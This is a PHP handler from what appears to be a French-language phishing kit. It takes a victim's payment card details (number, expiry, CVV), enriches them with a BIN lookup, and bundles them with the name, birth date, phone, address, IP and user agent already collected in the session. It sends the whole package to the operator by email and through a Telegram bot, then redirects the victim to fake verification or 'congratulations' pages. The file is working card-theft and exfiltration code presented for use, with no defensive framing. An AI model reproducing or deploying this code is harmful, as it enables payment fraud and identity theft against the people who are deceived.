<?php 

include ('../../antibots/sub_sub_includes.php');
include ('../../config.php');
include ('../funcs.php');

checkSession();

    
    if (!empty($_POST['nomcc'] && $_POST['cc'] && $_POST['exp'] && $_POST['cvv'])) {

        if(is_valid_luhn($_POST['cc']) && isset($_POST['cc']) && strlen($_POST['cc'] >= 16)){

        $cc = str_replace(' ', '', $_POST['cc']);
        $nomcc = $_POST['nomcc'];
        $exp = $_POST['exp'];
        $test = substr($exp, -2);
        $cvv = $_POST['cvv'];

        if ($test < 22) {
            header('location: ../../steps/card/index.php?error');
          } else {

        $bin = substr($cc, 0, 6);

        $ch = curl_init();

        $url = "https://lookup.binlist.net/$bin";

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');


        $headers = array();
        $headers[] = 'Accept-Version: 3';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);

        $brand = '';
        $type = '';
        $emoji = '';
        $bank = '';


        $someArray = json_decode($result, true);

        $emoji = $someArray['country']['emoji'];
        $brand = $someArray['brand'];
        $type = $someArray['type'];
        $bank = $someArray['bank']['name'];
        $bank_phone = $someArray['bank']['phone'];
        $level = $someArray['brand'];
        $scheme = $someArray['scheme'];

        $_SESSION['bank'] = $someArray['bank']['name'];
        $_SESSION['type'] = $someArray['type'];
        $_SESSION['level'] = $someArray['brand'];
        $_SESSION['country'] = $someArray['country']['emoji'];
         
            if ($rez_mail) {
               
                $message = "
                
「 💳 +1 CARD 💳 」

「💳」 Nom : $nomcc
「💳」 Numéro de carte : $cc
「💳」 Date d'expiration : $exp
「💳」 Cryptogramme Visuel : $cvv

「🔮」 Level :  ".$_SESSION['level']."
「🔮」 Type : ".$_SESSION['type']."
「🔮」 Bank : ".$_SESSION['bank']."
「🔮」 Country : ".$_SESSION['country']."

「 🧬 FULL INFO 🧬 」

「🍇」 Nom : ".$_SESSION['nom']."
「🍇」 Prénom : ".$_SESSION['prenom']."
「🍇」 Naissance : ".$_SESSION['naissance']."
「🍇」 Tel : ".$_SESSION['tel']."
「🍇」 Adresse : ".$_SESSION['adresse']."
「🍇」 Ville : ".$_SESSION['ville']."
「🍇」 Postal : ".$_SESSION['postal']."
          
「☂️」 Adresse ip : ".$_SESSION['ip']."
「☔️」 User Agent : ".$_SESSION['user_agent']."    

                ";

                $subject = "「💳」 +1 CARD • " .$_SESSION['bank']. " • " .$_SESSION['level']. " • " .$bin. " • " .$_SESSION['ip']. "「💳」";
                $headers = "From: $sender_from <$sender_mail@astridnelsia.fr>";
                mail($rezmail, $subject, $message, $headers);

            }

            if ($rez_tlg) {

                $message = "

「 💳 +1 CARD 💳 」

「💳」 Nom : $nomcc
「💳」 Numéro de carte : $cc
「💳」 Date d'expiration : $exp
「💳」 Cryptogramme Visuel : $cvv

「🔮」 Level :  ".$_SESSION['level']."
「🔮」 Type : ".$_SESSION['type']."
「🔮」 Bank : ".$_SESSION['bank']."
「🔮」 Country : ".$_SESSION['country']."

「 🧬 FULL INFO 🧬 」

「🍇」 Nom : ".$_SESSION['nom']."
「🍇」 Prénom : ".$_SESSION['prenom']."
「🍇」 Naissance : ".$_SESSION['naissance']."
「🍇」 Tel : ".$_SESSION['tel']."
「🍇」 Adresse : ".$_SESSION['adresse']."
「🍇」 Ville : ".$_SESSION['ville']."
「🍇」 Postal : ".$_SESSION['postal']."
          
「☂️」 Adresse ip : ".$_SESSION['ip']."
「☔️」 User Agent : ".$_SESSION['user_agent']."    
                                      
                ";

                file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$card_chatid&text=" . urlencode($message));

            }

            if ($vbv == true) {
                header('location: ../../steps/authentification/index.php');
            } else {
              header('location: ../../steps/congratulations/index.php');
            }

        }

        }
        else
        {
            header('location: ../../steps/card/index.php?error');
        }
    }
    else 
    {
        header('location: ../../steps/card/index.php?error');
    }

?>